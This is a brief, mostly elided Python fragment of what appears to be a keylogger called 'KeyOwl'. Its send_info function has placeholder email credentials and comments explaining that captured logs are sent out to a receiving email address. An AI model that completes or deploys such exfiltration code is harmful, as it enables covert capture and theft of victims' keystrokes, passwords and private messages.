...
def send_info(message):
    ...
    pwd = "The password of your e-mail"  #KeyOwl needs to send the logs through an e-mail account
    receiver = ["The e-mail to receive the logs"] #To an e-mail account
    text = message
...
while True:                                  #If the user enters an invalid character
